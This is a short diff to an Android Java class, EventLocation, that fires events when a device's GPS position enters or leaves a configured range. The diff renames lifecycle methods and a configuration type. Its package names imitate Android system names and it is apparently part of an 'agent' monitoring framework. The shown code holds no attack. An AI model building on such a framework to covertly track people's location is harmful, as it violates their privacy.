@@ -15,6 +15,7 @@ import com.android.service.agent.position.GPSLocator;
 import com.android.service.agent.position.GPSLocatorDistance;
 import com.android.service.agent.position.RangeObserver;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -31,13 +32,13 @@ public class EventLocation extends BaseEvent implements RangeObserver {
 	GPSLocator locator;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		locator = new GPSLocatorDistance(this, latitudeOrig, longitudeOrig, distance);
 		locator.start();
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		locator.halt();
 		try {
 			locator.join();
@@ -51,7 +52,7 @@ public class EventLocation extends BaseEvent implements RangeObserver {
 	}
 
 	@Override
-	public boolean parse(EventConf conf) {
+	public boolean parse(ConfEvent conf) {
 		try {
 			distance = conf.getInt("distance");
 
@@ -69,7 +70,7 @@ public class EventLocation extends BaseEvent implements RangeObserver {
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 	}
 
 	public int notification(Boolean onEnter) {
